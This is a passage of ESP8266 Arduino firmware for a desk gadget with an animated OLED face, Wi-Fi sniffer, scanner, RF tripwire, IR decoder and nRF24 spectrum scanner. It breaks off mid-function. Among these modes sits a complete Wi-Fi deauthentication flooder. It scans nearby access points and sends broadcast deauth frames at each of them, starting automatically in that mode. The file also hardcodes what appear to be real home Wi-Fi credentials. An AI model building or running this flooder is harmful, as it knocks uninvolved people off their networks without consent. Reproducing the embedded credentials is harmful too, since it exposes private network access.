#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>
#include <Wire.h>
#include <SPI.h>
#include <RF24.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <IRremoteESP8266.h>
#include <IRrecv.h>
#include <IRutils.h>
#include <time.h>

extern "C" {
  #include "user_interface.h"
}

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Hardware Pin Definitions
#define OLED_SDA      D3
#define OLED_SCL      D4
#define IR_RECV_PIN   D2
#define BUTTON_PIN    D1    // GPIO5
#define EXTERNAL_LED  D0    // GPIO16

// nRF24L01 Pin Definitions (Hardware HSPI: SCK=D5, MISO=D6, MOSI=D7)
#define NRF_CE_PIN    3     // GPIO3 (RX pin used as CE output)
#define NRF_CSN_PIN   D8    // GPIO15 (CSN)
RF24 radio(NRF_CE_PIN, NRF_CSN_PIN);

// LED Timer State Variables
bool alertLedActive = false;
unsigned long alertLedStart = 0;
const unsigned long LED_ALERT_DURATION = 120;

// nRF24 Spectrum Scanner Channels
#define NRF_NUM_CHANNELS 128
uint8_t nrfValues[NRF_NUM_CHANNELS];
uint8_t nrfStreak[NRF_NUM_CHANNELS];   // consecutive activity hits per channel
uint8_t nrfHold[NRF_NUM_CHANNELS];     // freezes a bar briefly after a hit
uint8_t nrfRxScratch[32];

// Scrolling spectrum history (right-to-left)
#define GRAPH_WIDTH 112
uint8_t nrfScrollBuf[GRAPH_WIDTH];   // one summary column per sweep, 0..63
uint32_t totalNrfHits = 0;
uint8_t peakChannel = 0;
uint8_t peakValue = 0;

// Detection state (so you KNOW when a transmitter is found)
bool     nrfRadioOk        = false;
bool     nrfDeviceFound    = false;
uint8_t  nrfFoundChannel   = 0;
unsigned long nrfFoundAt   = 0;
const uint8_t  NRF_DETECTION_STREAK   = 4;     // consecutive sweeps with signal = confirmed
const unsigned long NRF_FOUND_BANNER_MS = 5000;

// ==================== Wi-Fi Deauthentication ====================
#define MAX_DEAUTH_APS 10
#define DEAUTH_FRAMES_PER_BURST 8
#define DEAUTH_BURST_INTERVAL 120

struct DeauthAp {
  uint8_t mac[6];
  uint8_t channel;
  char    ssid[33];
  bool    valid;
};

DeauthAp deauthAps[MAX_DEAUTH_APS];
int      deauthApCount     = 0;
int      deauthCurrentAp   = 0;
uint32_t deauthPacketsSent = 0;
unsigned long lastDeauthBurst = 0;
unsigned long lastDeauthScan  = 0;
bool deauthScanning = false;
bool deauthRunning  = true;   // flood starts automatically in this mode

// Deauth frame: FC=0xC0 (deauth), reason 7 = class-3 frame from non-associated STA
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                                             // frame control
  0x00, 0x00,                                             // duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                     // DA  (filled per frame)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                     // SA  (filled per frame)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                     // BSSID (filled per frame)
  0x00, 0x00,                                             // sequence control
  0x07, 0x00                                              // reason code
};


// AP Config Portal Hotspot Credentials
const char* AP_CONFIG_SSID = "COCO-Desk-Buddy";
const char* AP_CONFIG_PASS = "12345678";

// EEPROM Storage Settings
#define EEPROM_SIZE 256
#define EEPROM_MAGIC 0x5A
#define EEPROM_BRIGHT_ADDR          97
#define EEPROM_AUTODIM_ADDR         98
#define EEPROM_AUTOLOCK_EN_ADDR     99
#define EEPROM_AUTOLOCK_SEC_ADDR    100
#define EEPROM_WISH_ARMED_ADDR      101
#define EEPROM_WISH_DATE_ADDR       102
#define EEPROM_WISH_TEXT_ADDR       110
#define EEPROM_GOOD_MORNING_EN_ADDR 120
#define EEPROM_GOOD_NIGHT_EN_ADDR   121

char target_ssid[33]     = "";
char target_password[65] = "";
uint8_t userBrightness   = 255;
bool autoDimEnabled      = false;
bool autoLockEnabled     = true;
uint16_t autoLockSeconds = 60;

// Daily Routine Toggles
bool goodMorningEnabled  = true;
bool goodNightEnabled    = true;
int lastMorningTriggerDay = -1;
int lastNightTriggerDay   = -1;

// Scheduled Wish Calendar Storage
struct WishTimeSchedule {
  uint16_t year;
  uint8_t  month;
  uint8_t  day;
  uint8_t  hour;
  uint8_t  minute;
  bool     armed;
};

WishTimeSchedule wishTarget = {0, 0, 0, 0, 0, false};
char scheduledSmsText[64]   = "Happy Birthday!";
bool isSmsAlertActive       = false;
unsigned long smsAlertStartTime = 0;
const unsigned long SMS_DISPLAY_DURATION = 30000;

uint8_t activeAlertType = 0;
int marqueeScrollX = 128;
unsigned long lastMarqueeShift = 0;

ESP8266WebServer server(80);

// NTP Time Configuration
const long  gmtOffset_sec     = 19800; // IST: +5:30
const int   daylightOffset_sec = 0;
const char* ntpServer         = "pool.ntp.org";

// Timers & State
const unsigned long CLOCK_TIMEOUT_MS = 20000;
unsigned long lastUserActivity       = 0;
bool isClockModeActive               = false;
bool isDeviceLocked                  = false;

bool isPeekClockActive               = false;
unsigned long peekClockStartTime     = 0;
const unsigned long PEEK_CLOCK_DURATION = 3000;

bool isBannerActive                  = false;
unsigned long bannerStartTime        = 0;
const unsigned long BANNER_DURATION  = 1200;

void setOledBrightness(uint8_t contrast) {
  display.ssd1306_command(SSD1306_SETCONTRAST);
  display.ssd1306_command(contrast);
}

void triggerLedAlert() {
  alertLedActive = true;
  alertLedStart = millis();
  digitalWrite(EXTERNAL_LED, HIGH);
}

void shutoffLeds() {
  digitalWrite(EXTERNAL_LED, LOW);
}

// Emotion Engine
enum EmoState {
  EMO_NORMAL,
  EMO_SUSPICIOUS,
  EMO_SHOCKED,
  EMO_WINK,
  EMO_SLEEP,
  EMO_LOVE
};

EmoState currentEmotion = EMO_NORMAL;
unsigned long emotionHoldStartTime = 0;
const unsigned long EMOTION_HOLD_MS = 2500;

void setEmotion(EmoState newEmo) {
  currentEmotion = newEmo;
  emotionHoldStartTime = millis();
}

bool isMorningWindow() {
  time_t tNow = time(nullptr);
  if (tNow < 100000) return false;
  struct tm* timeinfo = localtime(&tNow);
  if (timeinfo->tm_hour == 6) return true;
  if (timeinfo->tm_hour == 7 && timeinfo->tm_min <= 30) return true;
  return false;
}

bool isNightWindow() {
  time_t tNow = time(nullptr);
  if (tNow < 100000) return false;
  struct tm* timeinfo = localtime(&tNow);
  if (timeinfo->tm_hour >= 23 || timeinfo->tm_hour < 6) return true;
  return false;
}

// IR Decoder
const uint16_t kCaptureBufferSize = 1024;
const uint8_t kTimeout = 50;
IRrecv irrecv(IR_RECV_PIN, kCaptureBufferSize, kTimeout, true);
decode_results irResults;

String lastProtocol = "Ready";
String lastHexCode  = "Press Remote";
int lastBits        = 0;

// Wi-Fi Radar
#define MAX_TARGETS 8
struct Target {
  uint8_t mac[6];
  int rssi;
  float angle;
  unsigned long lastSeen;
  bool active;
};

Target targets[MAX_TARGETS];
uint8_t currentChannel = 1;
unsigned long lastChannelHop = 0;
unsigned long lastDisplayDraw = 0;
float sweepAngle = 0.0;

struct RxControl {
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};

struct SnifferPacket {
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};

int totalNetworksFound = 0;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 5000;
bool scanningInProgress = false;

// Tripwire
const unsigned long SAMPLE_RATE_MS = 50;
const float EMA_ALPHA = 0.08;
float baselineRSSI = 0.0;
bool baselineInitialized = false;
unsigned long lastSampleTime = 0;
unsigned long lastMotionDetected = 0;
const unsigned long ALARM_HOLD_TIME = 1500;
bool isCalibrating = false;
unsigned long calibrationStartTime = 0;
float maxNoiseObserved = 0.0;
float dynamicThreshold = 2.4;

#define WAVE_POINTS 128
int waveBuffer[WAVE_POINTS];
int waveIndex = 0;

// Device Modes
enum DeviceMode {
  MODE_RADAR = 0,
  MODE_SCANNER = 1,
  MODE_RF_TRIPWIRE = 2,
  MODE_IR_DECODER = 3,
  MODE_NRF_SCANNER = 4,
  MODE_DEAUTH = 5,
  MODE_AP_CONFIG = 6
};

DeviceMode currentMode = MODE_RADAR;
DeviceMode resumeMode  = MODE_RADAR;

// Button
unsigned long lastButtonCheck = 0;
bool buttonIsPressed = false;
unsigned long buttonPressStartTime = 0;
bool holdThresholdMet = false;
int clickCount = 0;
unsigned long lastClickTime = 0;
const unsigned long DOUBLE_CLICK_GAP = 350;

// Eyes
float currentEyeX = 0.0;
float currentEyeY = 0.0;
float targetEyeX  = 0.0;
float targetEyeY  = 0.0;
float currentEyeH = 30.0;
float targetEyeH  = 30.0;

unsigned long lastEyeTargetShift = 0;
bool isBlinking = false;
unsigned long blinkStartTime = 0;
int zzzStep = 0;
unsigned long lastZzzAnim = 0;

void enterLockScreen();
void unlockDevice();
void drawEmoFace();

// ==================== RF HELPERS ====================

bool ensureNrfRadioReady() {
  if (nrfRadioOk) return true;

  nrfRadioOk = radio.begin();
  if (!nrfRadioOk) return false;

  radio.setAutoAck(false);
  radio.disableCRC();
  radio.setDataRate(RF24_2MBPS);
  radio.setPALevel(RF24_PA_MAX);
  radio.setAddressWidth(3);
  return true;
}

// =============================================================

void loadCredentials() {
  EEPROM.begin(EEPROM_SIZE);
  if (EEPROM.read(0) == EEPROM_MAGIC) {
    for (int i = 0; i < 32; i++) target_ssid[i] = EEPROM.read(1 + i);
    target_ssid[32] = '\0';
    for (int i = 0; i < 64; i++) target_password[i] = EEPROM.read(33 + i);
    target_password[64] = '\0';

    uint8_t storedBright = EEPROM.read(EEPROM_BRIGHT_ADDR);
    userBrightness = (storedBright >= 1 && storedBright <= 255) ? storedBright : 255;

    uint8_t storedDim = EEPROM.read(EEPROM_AUTODIM_ADDR);
    autoDimEnabled = (storedDim == 1);

    uint8_t storedLockEn = EEPROM.read(EEPROM_AUTOLOCK_EN_ADDR);
    autoLockEnabled = (storedLockEn != 0);

    uint8_t storedLockSec = EEPROM.read(EEPROM_AUTOLOCK_SEC_ADDR);
    autoLockSeconds = (storedLockSec >= 15 && storedLockSec <= 300) ? storedLockSec : 60;

    wishTarget.armed  = (EEPROM.read(EEPROM_WISH_ARMED_ADDR) == 1);
    wishTarget.year   = (EEPROM.read(EEPROM_WISH_DATE_ADDR) << 8) | EEPROM.read(EEPROM_WISH_DATE_ADDR + 1);
    wishTarget.month  = EEPROM.read(EEPROM_WISH_DATE_ADDR + 2);
    wishTarget.day    = EEPROM.read(EEPROM_WISH_DATE_ADDR + 3);
    wishTarget.hour   = EEPROM.read(EEPROM_WISH_DATE_ADDR + 4);
    wishTarget.minute = EEPROM.read(EEPROM_WISH_DATE_ADDR + 5);

    for (int i = 0; i < 63; i++) {
      scheduledSmsText[i] = EEPROM.read(EEPROM_WISH_TEXT_ADDR + i);
    }
    scheduledSmsText[63] = '\0';
    if (strlen(scheduledSmsText) == 0) {
      strcpy(scheduledSmsText, "Happy Birthday!");
    }

    uint8_t storedMorning = EEPROM.read(EEPROM_GOOD_MORNING_EN_ADDR);
    goodMorningEnabled = (storedMorning != 0);

    uint8_t storedNight = EEPROM.read(EEPROM_GOOD_NIGHT_EN_ADDR);
    goodNightEnabled = (storedNight != 0);
  } else {
    strncpy(target_ssid, "Airfiber-3rdFloorBachelor", sizeof(target_ssid));
    strncpy(target_password, "Airfiber-3rdfloor", sizeof(target_password));
    userBrightness = 255;
    autoDimEnabled = false;
    autoLockEnabled = true;
    autoLockSeconds = 60;
    wishTarget.armed = false;
    strcpy(scheduledSmsText, "Happy Birthday!");
    goodMorningEnabled = true;
    goodNightEnabled = true;
  }
}

void saveSettings(const String& newSSID, const String& newPass, uint8_t newBright, bool newDim, bool newLockEn, uint16_t newLockSec, bool newMorning, bool newNight) {
  EEPROM.write(0, EEPROM_MAGIC);
  for (int i = 0; i < 32; i++) EEPROM.write(1 + i, i < (int)newSSID.length() ? newSSID[i] : 0);
  for (int i = 0; i < 64; i++) EEPROM.write(33 + i, i < (int)newPass.length() ? newPass[i] : 0);
  EEPROM.write(EEPROM_BRIGHT_ADDR, newBright);
  EEPROM.write(EEPROM_AUTODIM_ADDR, newDim ? 1 : 0);
  EEPROM.write(EEPROM_AUTOLOCK_EN_ADDR, newLockEn ? 1 : 0);
  EEPROM.write(EEPROM_AUTOLOCK_SEC_ADDR, (uint8_t)newLockSec);
  EEPROM.write(EEPROM_GOOD_MORNING_EN_ADDR, newMorning ? 1 : 0);
  EEPROM.write(EEPROM_GOOD_NIGHT_EN_ADDR, newNight ? 1 : 0);
  EEPROM.commit();

  newSSID.toCharArray(target_ssid, sizeof(target_ssid));
  newPass.toCharArray(target_password, sizeof(target_password));
  userBrightness = newBright;
  autoDimEnabled = newDim;
  autoLockEnabled = newLockEn;
  autoLockSeconds = newLockSec;
  goodMorningEnabled = newMorning;
  goodNightEnabled = newNight;
}

void saveAutoLockState(bool enabled) {
  EEPROM.write(EEPROM_AUTOLOCK_EN_ADDR, enabled ? 1 : 0);
  EEPROM.commit();
  autoLockEnabled = enabled;
}

void armCalendarWish(uint16_t y, uint8_t m, uint8_t d, uint8_t hr, uint8_t mn, const String& text) {
  wishTarget.year   = y;
  wishTarget.month  = m;
  wishTarget.day    = d;
  wishTarget.hour   = hr;
  wishTarget.minute = mn;
  wishTarget.armed  = true;

  EEPROM.write(EEPROM_WISH_ARMED_ADDR, 1);
  EEPROM.write(EEPROM_WISH_DATE_ADDR,     (y >> 8) & 0xFF);
  EEPROM.write(EEPROM_WISH_DATE_ADDR + 1, y & 0xFF);
  EEPROM.write(EEPROM_WISH_DATE_ADDR + 2, m);
  EEPROM.write(EEPROM_WISH_DATE_ADDR + 3, d);
  EEPROM.write(EEPROM_WISH_DATE_ADDR + 4, hr);
  EEPROM.write(EEPROM_WISH_DATE_ADDR + 5, mn);

  text.toCharArray(scheduledSmsText, sizeof(scheduledSmsText));
  for (int i = 0; i < 63; i++) {
    EEPROM.write(EEPROM_WISH_TEXT_ADDR + i, i < (int)text.length() ? text[i] : 0);
  }
  EEPROM.write(EEPROM_WISH_TEXT_ADDR + 63, 0);
  EEPROM.commit();
}

void clearScheduledWish() {
  wishTarget.armed = false;
  EEPROM.write(EEPROM_WISH_ARMED_ADDR, 0);
  EEPROM.commit();
}

void registerTarget(uint8_t* mac, int rssi) {
  int targetIndex = -1;
  for (int i = 0; i < MAX_TARGETS; i++) {
    if (targets[i].active && memcmp(targets[i].mac, mac, 6) == 0) {
      targetIndex = i;
      break;
    }
  }
  if (targetIndex == -1) {
    for (int i = 0; i < MAX_TARGETS; i++) {
      if (!targets[i].active) {
        targetIndex = i;
        break;
      }
    }
  }
  if (targetIndex == -1) targetIndex = random(0, MAX_TARGETS);

  memcpy(targets[targetIndex].mac, mac, 6);
  targets[targetIndex].rssi = rssi;
  targets[targetIndex].lastSeen = millis();
  if (!targets[targetIndex].active) targets[targetIndex].angle = random(0, 360) * (PI / 180.0);
  targets[targetIndex].active = true;

  triggerLedAlert();
  if (isDeviceLocked) setEmotion(EMO_SUSPICIOUS);
}

void snifferCallback(uint8_t *buf, uint16_t len) {
  if (len == 12) return;
  struct SnifferPacket *sniffer = (struct SnifferPacket*) buf;
  if (sniffer->buf[0] == 0x40) {
    registerTarget(&sniffer->buf[10], sniffer->rx_ctrl.rssi);
  }
}

void triggerWifiScan() {
  scanningInProgress = true;
  WiFi.scanNetworksAsync([](int networksFound) {
    totalNetworksFound = networksFound;
    scanningInProgress = false;
  });
}

void handleRoot() {
  if (currentMode == MODE_AP_CONFIG) {
    WiFi.mode(WIFI_AP_STA);
    int n = WiFi.scanNetworks();

    String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<style>body{font-family:Arial,sans-serif;background:#121212;color:#eee;text-align:center;padding:20px;}";
    html += "form{background:#1f1f1f;padding:22px;border-radius:12px;display:inline-block;max-width:340px;width:100%;box-sizing:border-box;}";
    html += "select,input[type=password],input[type=text],input[type=datetime-local]{width:100%;padding:10px;margin:8px 0 16px 0;border-radius:6px;border:1px solid #333;background:#2a2a2a;color:#fff;box-sizing:border-box;}";
    html += ".slider-container{margin:15px 0 10px 0;text-align:left;}";
    html += ".toggle-container{margin:12px 0;text-align:left;display:flex;align-items:center;}";
    html += "input[type=range]{width:100%;margin:10px 0;accent-color:#00bcd4;cursor:pointer;}";
    html += "input[type=checkbox]{width:18px;height:18px;margin-right:10px;accent-color:#00bcd4;cursor:pointer;}";
    html += "input[type=submit]{width:100%;background:#00bcd4;color:#fff;padding:12px;border:none;border-radius:6px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:12px;}";
    html += "label{font-size:14px;color:#aaa;display:block;text-align:left;font-weight:bold;}";
    html += ".val-badge{float:right;color:#00bcd4;font-size:14px;}";
    html += "hr{border:0;border-top:1px solid #333;margin:20px 0;}";
    html += "</style></head><body><h2>COCO Setup</h2>";
    html += "<form method='POST' action='/save'>";
    html += "<label>Select Nearby Wi-Fi:</label><select name='ssid'>";

    if (n == 0) {
      html += "<option value=''>No networks found</option>";
    } else {
      for (int i = 0; i < n; ++i) {
        String s = WiFi.SSID(i);
        s.trim();
        if (s.length() > 0) {
          String selected = (s == String(target_ssid)) ? " selected" : "";
          html += "<option value='" + s + "'" + selected + ">" + s + " (" + String(WiFi.RSSI(i)) + " dBm)</option>";
        }
      }
    }

    html += "</select><label>Password:</label>";
    html += "<input type='password' name='pass' value='" + String(target_password) + "'><br>";

    html += "<div class='slider-container'>";
    html += "<label>Manual Brightness: <span id='bVal' class='val-badge'>" + String(userBrightness) + "</span></label>";
    html += "<input type='range' name='bright' min='1' max='255' value='" + String(userBrightness) + "' oninput=\"document.getElementById('bVal').innerText=this.value;\">";
    html += "</div>";

    html += "<div class='toggle-container'>";
    html += "<input type='checkbox' id='autodim' name='autodim' value='1'" + String(autoDimEnabled ? " checked" : "") + ">";
    html += "<label for='autodim' style='font-size:13px;cursor:pointer;color:#eee;'>Auto-dim on Lock / Clock</label>";
    html += "</div>";

    html += "<div class='toggle-container'>";
    html += "<input type='checkbox' id='autolock' name='autolock' value='1'" + String(autoLockEnabled ? " checked" : "") + ">";
    html += "<label for='autolock' style='font-size:13px;cursor:pointer;color:#eee;'>Enable Auto-Lock (EMO Face)</label>";
    html += "</div>";

    html += "<div class='slider-container'>";
    html += "<label>Lock Timeout (sec): <span id='lVal' class='val-badge'>" + String(autoLockSeconds) + "s</span></label>";
    html += "<input type='range' name='locksec' min='15' max='300' step='5' value='" + String(autoLockSeconds) + "' oninput=\"document.getElementById('lVal').innerText=this.value+'s';\">";
    html += "</div>";

    html += "<hr><h3 style='margin:10px 0;color:#00bcd4;'>Daily Messages</h3>";
    html += "<div class='toggle-container'>";
    html += "<input type='checkbox' id='gmorning' name='gmorning' value='1'" + String(goodMorningEnabled ? " checked" : "") + ">";
    html += "<label for='gmorning' style='font-size:13px;cursor:pointer;color:#eee;'>Good Morning at 7:00 AM</label>";
    html += "</div>";

    html += "<div class='toggle-container'>";
    html += "<input type='checkbox' id='gnight' name='gnight' value='1'" + String(goodNightEnabled ? " checked" : "") + ">";
    html += "<label for='gnight' style='font-size:13px;cursor:pointer;color:#eee;'>Good Night at 10:30 PM</label>";
    html += "</div>";

    html += "<hr><h3 style='margin:10px 0;color:#00bcd4;'>Match Clock & Wish</h3>";
    html += "<label>Wish Message:</label>";
    html += "<input type='text' name='smstext' maxlength='60' placeholder='Write your msg' value=''>";
    html += "<label>Set Target Date & Time:</label>";
    html += "<input type='datetime-local' name='smstime'>";

    if (wishTarget.armed) {
      char buf[32];
      snprintf(buf, sizeof(buf), "%02d-%02d-%04d %02d:%02d", wishTarget.day, wishTarget.month, wishTarget.year, wishTarget.hour, wishTarget.minute);
      html += "<p style='font-size:13px;color:#00bcd4;margin:4px 0 12px 0;'>Countdown armed for: " + String(buf) + "</p>";
    }

    html += "<input type='submit' value='Save & Apply'></form></body></html>";
    server.send(200, "text/html", html);
  } else {
    server.send(200, "text/plain", "COCO Ready");
  }
}

void handleConfigSave() {
  String reqSSID     = server.arg("ssid");
  String reqPass     = server.arg("pass");
  String reqBright   = server.arg("bright");
  bool reqAutoDim    = server.hasArg("autodim");
  bool reqAutoLock   = server.hasArg("autolock");
  String reqLockSec  = server.arg("locksec");
  bool reqMorning    = server.hasArg("gmorning");
  bool reqNight      = server.hasArg("gnight");
  String reqSmsText  = server.arg("smstext");
  String reqSmsTime  = server.arg("smstime");

  uint8_t newBright = userBrightness;
  if (reqBright.length() > 0) {
    int b = reqBright.toInt();
    if (b >= 1 && b <= 255) newBright = (uint8_t)b;
  }

  uint16_t newLockSec = autoLockSeconds;
  if (reqLockSec.length() > 0) {
    int ls = reqLockSec.toInt();
    if (ls >= 15 && ls <= 300) newLockSec = (uint16_t)ls;
  }

  if (reqSmsTime.length() >= 16) {
    uint16_t y  = reqSmsTime.substring(0, 4).toInt();
    uint8_t  m  = reqSmsTime.substring(5, 7).toInt();
    uint8_t  d  = reqSmsTime.substring(8, 10).toInt();
    uint8_t  hr = reqSmsTime.substring(11, 13).toInt();
    uint8_t  mn = reqSmsTime.substring(14, 16).toInt();

    String textToSave = (reqSmsText.length() > 0) ? reqSmsText : "Happy Birthday!";
    armCalendarWish(y, m, d, hr, mn, textToSave);
  }

  if (reqSSID.length() > 0) {
    saveSettings(reqSSID, reqPass, newBright, reqAutoDim, reqAutoLock, newLockSec, reqMorning, reqNight);
    setOledBrightness(newBright);

    String html = "<html><body style='background:#121212;color:#eee;text-align:center;padding:40px;font-family:Arial;'>";
    html += "<h2>Settings Saved!</h2><p>Rebooting...</p></body></html>";
    server.send(200, "text/html", html);
    delay(1500);
    ESP.restart();
  } else {
    server.send(400, "text/plain", "SSID cannot be empty.");
  }
}

void initNrfScanner() {
  if (!ensureNrfRadioReady()) {
    memset(nrfValues, 0, sizeof(nrfValues));
    memset(nrfStreak, 0, sizeof(nrfStreak));
    memset(nrfHold, 0, sizeof(nrfHold));
  memset(nrfScrollBuf, 0, sizeof(nrfScrollBuf));
    totalNrfHits = 0;
    nrfDeviceFound = false;
    return;
  }

  radio.setAutoAck(false);
  radio.disableCRC();
  radio.setDataRate(RF24_2MBPS);
  radio.setPALevel(RF24_PA_MAX);
  radio.setAddressWidth(3);
  radio.openReadingPipe(0, (uint64_t)0);   // accept almost anything
  radio.startListening();
  radio.stopListening();
  memset(nrfValues, 0, sizeof(nrfValues));
  memset(nrfStreak, 0, sizeof(nrfStreak));
  memset(nrfHold, 0, sizeof(nrfHold));
  memset(nrfScrollBuf, 0, sizeof(nrfScrollBuf));
  totalNrfHits = 0;
  nrfDeviceFound = false;
}

// ==================== DEAUTH HELPERS ====================

void sendDeauthFrame(const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
  memcpy(&deauthPacket[4],  da, 6);
  memcpy(&deauthPacket[10], sa, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  if (wifi_send_pkt_freedom(deauthPacket, 26, 0) == 0) {
    deauthPacketsSent++;
  }
}

void updateDeauth() {
  unsigned long now = millis();

  // No targets yet -> (re)scan
  if (deauthApCount == 0) {
    if (!deauthScanning && now - lastDeauthScan > 8000) {
      lastDeauthScan = now;
      deauthScanning = true;
      WiFi.scanNetworksAsync([](int found) {
        deauthApCount = 0;
        for (int i = 0; i < found && deauthApCount < MAX_DEAUTH_APS; i++) {
          String s = WiFi.SSID(i);
          s.trim();
          if (s.length() == 0) continue;
          DeauthAp& ap = deauthAps[deauthApCount];
          memcpy(ap.mac, WiFi.BSSID(i), 6);
          ap.channel = WiFi.channel(i);
          s.toCharArray(ap.ssid, sizeof(ap.ssid));
          ap.valid = true;
          deauthApCount++;
        }
        deauthScanning = false;
      });
    }
    return;
  }

  if (!deauthRunning) return;
  if (now - lastDeauthBurst < DEAUTH_BURST_INTERVAL) return;
  lastDeauthBurst = now;

  DeauthAp& ap = deauthAps[deauthCurrentAp];
  wifi_set_channel(ap.channel);

  static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  for (int f = 0; f < DEAUTH_FRAMES_PER_BURST / 2; f++) {
    sendDeauthFrame(broadcast, ap.mac, ap.mac);   // AP  -> all clients
    sendDeauthFrame(ap.mac, broadcast, ap.mac);   // all -> AP
    delay(2);
  }

  triggerLedAlert();
  deauthCurrentAp = (deauthCurrentAp + 1) % deauthApCount;
}

// =============================================================

void configureMode(DeviceMode newMode) {
  currentMode = newMode;
  display.clearDisplay();
  setOledBrightness(userBrightness);

  server.stop();
  wifi_promiscuous_enable(0);
  irrecv.disableIRIn();
  radio.powerDown();
  shutoffLeds();
  alertLedActive = false;

  switch (currentMode) {
    case MODE_RADAR:
      WiFi.persistent(false);
      WiFi.disconnect();
      WiFi.mode(WIFI_STA);
      wifi_set_opmode(STATION_MODE);
      wifi_promiscuous_enable(0);
      wifi_set_promiscuous_rx_cb(snifferCallback);
      wifi_promiscuous_enable(1);
      break;

    case MODE_SCANNER:
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      totalNetworksFound = 0;
      triggerWifiScan();
      lastScanTime = millis();
      break;

    case MODE_RF_TRIPWIRE:
      WiFi.mode(WIFI_STA);
      WiFi.setSleepMode(WIFI_NONE_SLEEP);
      WiFi.begin(target_ssid, target_password);
      baselineInitialized = false;
      isCalibrating = false;
      calibrationStartTime = 0;
      maxNoiseObserved = 0.0;
      for (int i = 0; i < WAVE_POINTS; i++) waveBuffer[i] = 42;
      break;

    case MODE_IR_DECODER:
      WiFi.disconnect();
      WiFi.mode(WIFI_OFF);
      irrecv.setUnknownThreshold(12);
      irrecv.enableIRIn();
      break;

    case MODE_NRF_SCANNER:
      WiFi.disconnect();
      WiFi.mode(WIFI_OFF);
      radio.powerUp();
      initNrfScanner();
      break;

    case MODE_DEAUTH:
      WiFi.persistent(false);
      WiFi.disconnect();
      WiFi.mode(WIFI_STA);
      deauthApCount   = 0;
      deauthCurrentAp = 0;
      deauthPacketsSent = 0;
      deauthRunning   = true;
      deauthScanning  = false;
      lastDeauthScan  = 0;
      lastDeauthBurst = 0;
      break;

    case MODE_AP_CONFIG: {
      WiFi.persistent(false);
      WiFi.disconnect(true);
      delay(50);
      WiFi.mode(WIFI_AP_STA);

      IPAddress local_ip(192, 168, 4, 1);
      IPAddress gateway(192, 168, 4, 1);
      IPAddress subnet(255, 255, 255, 0);
      WiFi.softAPConfig(local_ip, gateway, subnet);
      WiFi.softAP(AP_CONFIG_SSID, AP_CONFIG_PASS, 1, 0, 4);

      server.begin();
      break;
    }
  }
}

void enterLockScreen() {
  isDeviceLocked = true;
  isClockModeActive = false;
  isPeekClockActive = false;
  resumeMode = currentMode;

  shutoffLeds();
  alertLedActive = false;

  if (autoDimEnabled) {
    uint8_t dimLevel = map(userBrightness, 1, 255, 1, 35);
    setOledBrightness(dimLevel);
  } else {
    setOledBrightness(userBrightness);
  }

  if (isNightWindow()) {
    currentEmotion = EMO_SLEEP;
  } else {
    currentEmotion = EMO_NORMAL;
  }

  display.clearDisplay();
  display.display();
}

void unlockDevice() {
  isDeviceLocked = false;
  isPeekClockActive = false;
  isSmsAlertActive = false;
  lastUserActivity = millis();

  setOledBrightness(userBrightness);
  display.clearDisplay();
  configureMode(resumeMode);
}

void drawDeskBuddyEye(int x, int y, int w, int h, int pupilShiftX, int pupilShiftY) {
  if (h <= 4) {
    display.fillRoundRect(x, y + 13, w, 4, 2, SSD1306_WHITE);
    return;
  }

  int cornerRadius = 9;
  if (h < 18) cornerRadius = h / 2;

  display.fillRoundRect(x, y, w, h, cornerRadius, SSD1306_WHITE);

  int pupilW = 10;
  int pupilH = (h > 16) ? 10 : (h - 6);
  if (pupilH < 3) pupilH = 3;

  int pupilCenterX = x + (w / 2) + pupilShiftX;
  int pupilCenterY = y + (h / 2) + pupilShiftY;

  display.fillRoundRect(pupilCenterX - (pupilW / 2), pupilCenterY - (pupilH / 2), pupilW, pupilH, 3, SSD1306_BLACK);
}

void drawHappyArchedEye(int x, int y, int w) {
  display.fillRoundRect(x, y, w, 18, 9, SSD1306_WHITE);
  display.fillRoundRect(x, y + 6, w, 18, 9, SSD1306_BLACK);
}

void drawSmallHeart(int x, int y, int size) {
  if (size <= 2) {
    display.fillCircle(x - 2, y, 2, SSD1306_WHITE);
    display.fillCircle(x + 2, y, 2, SSD1306_WHITE);
    display.fillTriangle(x - 4, y, x + 4, y, x, y + 5, SSD1306_WHITE);
  } else {
    display.fillCircle(x - 3, y - 1, 3, SSD1306_WHITE);
    display.fillCircle(x + 3, y - 1, 3, SSD1306_WHITE);
    display.fillTriangle(x - 6, y, x + 6, y, x, y + 8, SSD1306_WHITE);
  }
}

void drawAutoLockBanner() {
  display.clearDisplay();
  display.drawRoundRect(10, 14, 108, 36, 6, SSD1306_WHITE);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(24, 20);
  display.print("AUTO-LOCK:");
  display.setTextSize(2);
  display.setCursor(44, 32);
  display.print(autoLockEnabled ? "ON" : "OFF");
  display.display();
}

void drawBirthdayWishUI() {
  unsigned long now = millis();
